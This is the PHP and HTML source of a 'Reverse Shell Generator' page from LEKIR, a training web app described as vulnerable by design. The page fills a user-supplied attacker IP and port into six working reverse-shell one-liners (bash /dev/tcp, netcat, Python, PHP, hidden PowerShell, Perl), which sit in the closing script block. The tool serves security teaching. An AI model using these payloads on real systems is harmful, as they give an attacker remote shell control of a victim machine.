<?php
// Determine the base path based on current directory depth
$current_path = $_SERVER['PHP_SELF'];
$base_path = './';
if (strpos($current_path, '/vulnerabilities/') !== false) {
    $parts = explode('/vulnerabilities/', $current_path);
    if (isset($parts[1]) && strpos($parts[1], '/') !== false) {
        $base_path = '../../';
    } else {
        $base_path = '../';
    }
} elseif (strpos($current_path, '/tools/') !== false || strpos($current_path, '/compare/') !== false || strpos($current_path, '/components/') !== false) {
    $base_path = '../';
}

session_start();
include($base_path . 'core/configuration.php');
include($base_path . "core/function.php");

$session = new Session();
$session->check_invalid_session();

$secure = new Secure();
$level = new Level();
?>
<!doctype html>
<!--
* LEKIR - Vulnerable by design to learn common web vulnerability
* Learning Environment for Cybersecurity through Immersive Real-world scenarios
* By Firdaus Khairuddin
-->
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
    <title><?php echo htmlentities($title); ?> - Reverse Shell Generator</title>
    <link rel="icon" href="<?php echo $base_path; ?>static/lekir.jpeg" type="image/png">
    <!-- CSS files -->
    <link href="<?php echo $base_path; ?>dist/css/tabler.min.css?1684106062" rel="stylesheet"/>
    <link href="<?php echo $base_path; ?>dist/css/tabler-flags.min.css?1684106062" rel="stylesheet"/>
    <link href="<?php echo $base_path; ?>dist/css/tabler-vendors.min.css?1684106062" rel="stylesheet"/>
    <link href="<?php echo $base_path; ?>dist/css/demo.min.css?1684106062" rel="stylesheet"/>
    <style>
      @import url("https://rsms.me/inter/inter.css");
      :root {
      	--tblr-font-sans-serif: 'Inter Var', -apple-system, BlinkMacSystemFont, San Francisco, Segoe UI, Roboto, Helvetica Neue, sans-serif;
      }
      body {
      	font-feature-settings: 'cv03', "cv04", "cv11";
        background-color: #f8fafc;
      }
      .tool-card {
        transition: all 0.3s ease;
        border: 1px solid rgba(0,0,0,0.05);
      }
      .shell-output {
        font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
        font-size: 0.9rem;
        background-color: #1e293b;
        color: #a5b4fc;
        border: 1px solid #334155;
        border-radius: 4px;
        padding: 1rem;
        min-height: 100px;
        white-space: pre-wrap;
        word-break: break-all;
      }
      .info-list li {
        margin-bottom: 0.75rem;
        display: flex;
        align-items: flex-start;
      }
      .info-icon {
        margin-top: 0.2rem;
        margin-right: 0.75rem;
        color: #206bc4;
      }
    </style>
  </head>
  <body >
    <script src="<?php echo $base_path; ?>dist/js/demo-theme.min.js?1684106062"></script>
    <div class="page">
      <!-- Navbar -->
      <?php include($base_path . "components/top_navbar.php"); ?>
      <?php include($base_path . "components/header.php"); ?>
      
      <div class="page-wrapper">
        <div class="page-header d-print-none">
          <div class="container-xl">
            <div class="row g-2 align-items-center">
              <div class="col">
                <div class="page-pretitle">
                  Tool
                </div>
                <h2 class="page-title">
                  Reverse Shell Generator
                </h2>
              </div>
            </div>
          </div>
        </div>

        <div class="page-body">
          <div class="container-xl">
            <div class="row row-cards">
            
              <!-- Info Sidebar -->
              <div class="col-lg-4">
                <div class="card tool-card h-100">
                  <div class="card-body">
                    <div class="d-flex align-items-center mb-4">
                      <div class="me-3">
                        <div class="bg-blue-lt p-2 rounded-circle">
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-terminal-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 9l3 3l-3 3" /><path d="M13 15l3 0" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /></svg>
                        </div>
                      </div>
                      <div>
                        <small class="text-muted d-block">Information</small>
                        <h3 class="lh-1 m-0">About Reverse Shells</h3>
                      </div>
                    </div>
                    
                    <ul class="list-unstyled info-list text-secondary">
                      <li>
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon info-icon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /><path d="M12 8l-4 4l4 4" /></svg>
                        <div>
                            <strong>Type:</strong> Payload Generation
                        </div>
                      </li>
                      <li>
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon info-icon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z" /><path d="M4 9h16" /><path d="M4 15h16" /><path d="M10 3v6" /><path d="M14 3v6" /></svg>
                        <div>
                            <strong>Short Form:</strong> Rev Shell
                        </div>
                      </li>
                      <li>
                         <svg xmlns="http://www.w3.org/2000/svg" class="icon info-icon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1 0 18 0a9 9 0 0 0 -18 0" /><path d="M12 9h.01" /><path d="M11 12h1v4h1" /></svg>
                        <div>
                            <strong>Use case:</strong> Generates one-liner commands to establish a shell session from a target machine back to the attacker.
                        </div>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>

              <!-- Tool Area -->
              <div class="col-lg-8">
                <div class="card tool-card">
                  <div class="card-header">
                     <h3 class="card-title">Payload Config</h3>
                  </div>
                  <div class="card-body">
                    
                    <div class="row g-3 mb-4">
                        <div class="col-md-8">
                            <label class="form-label required">IP Address (LHOST)</label>
                            <input type="text" class="form-control" id="lhost" placeholder="10.10.10.10" oninput="generatePayload()">
                        </div>
                        <div class="col-md-4">
                            <label class="form-label required">Port (LPORT)</label>
                            <input type="number" class="form-control" id="lport" value="9001" placeholder="9001" oninput="generatePayload()">
                        </div>
                    </div>

                    <div class="mb-4">
                        <label class="form-label required">Payload Type</label>
                         <div class="form-selectgroup">
                            <label class="form-selectgroup-item">
                              <input type="radio" name="payloadInfo" value="bash" class="form-selectgroup-input" checked onchange="generatePayload()">
                              <span class="form-selectgroup-label">Bash</span>
                            </label>
                             <label class="form-selectgroup-item">
                              <input type="radio" name="payloadInfo" value="nc" class="form-selectgroup-input" onchange="generatePayload()">
                              <span class="form-selectgroup-label">Netcat</span>
                            </label>
                            <label class="form-selectgroup-item">
                              <input type="radio" name="payloadInfo" value="python" class="form-selectgroup-input" onchange="generatePayload()">
                              <span class="form-selectgroup-label">Python</span>
                            </label>
                            <label class="form-selectgroup-item">
                              <input type="radio" name="payloadInfo" value="php" class="form-selectgroup-input" onchange="generatePayload()">
                              <span class="form-selectgroup-label">PHP</span>
                            </label>
                             <label class="form-selectgroup-item">
                              <input type="radio" name="payloadInfo" value="powershell" class="form-selectgroup-input" onchange="generatePayload()">
                              <span class="form-selectgroup-label">PowerShell</span>
                            </label>
                             <label class="form-selectgroup-item">
                              <input type="radio" name="payloadInfo" value="perl" class="form-selectgroup-input" onchange="generatePayload()">
                              <span class="form-selectgroup-label">Perl</span>
                            </label>
                          </div>
                    </div>

                    <div class="mb-3">
                         <div class="d-flex justify-content-between mb-2">
                             <label class="form-label">Command</label>
                             <button class="btn btn-sm btn-ghost-primary" onclick="copyPayload()">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z" /><path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2" /></svg>
                                Copy
                             </button>
                         </div>
                        <div class="shell-output" id="outputPayload">
                            Waiting for input...
                        </div>
                    </div>

                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <?php include($base_path . "components/footer.php");?>
      </div>
    </div>
    
    <!-- Scripts -->
    <script>
        const payloads = {
            bash: "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            nc: "nc -e /bin/sh {ip} {port}",
            python: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            php: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            powershell: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
            perl: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        };

        function generatePayload() {
            const ip = document.getElementById('lhost').value.trim() || "{ip}";
            const port = document.getElementById('lport').value.trim() || "{port}";
            
            // Get selected radio
            const radios = document.getElementsByName('payloadInfo');
            let selectedType = 'bash';
            for (const radio of radios) {
                if (radio.checked) {
                    selectedType = radio.value;
                    break;
                }
            }

            let template = payloads[selectedType];
            let result = template.replace(/{ip}/g, ip).replace(/{port}/g, port);
            
            document.getElementById('outputPayload').innerText = result;
        }

        function copyPayload() {
            const payload = document.getElementById('outputPayload').innerText;
            navigator.clipboard.writeText(payload);
            
             // Visual feedback
            const display = document.getElementById('outputPayload');
            
            display.style.borderColor = "#2fb344";
            
            setTimeout(() => {
                display.style.borderColor = "#334155";
            }, 500);
        }

        // Generate on load
        window.onload = generatePayload;
    </script>
    <!-- Libs JS -->
    <script src="<?php echo $base_path; ?>dist/js/tabler.min.js?1684106062" defer></script>
    <script src="<?php echo $base_path; ?>dist/js/demo.min.js?1684106062" defer></script>
  </body>
</html>
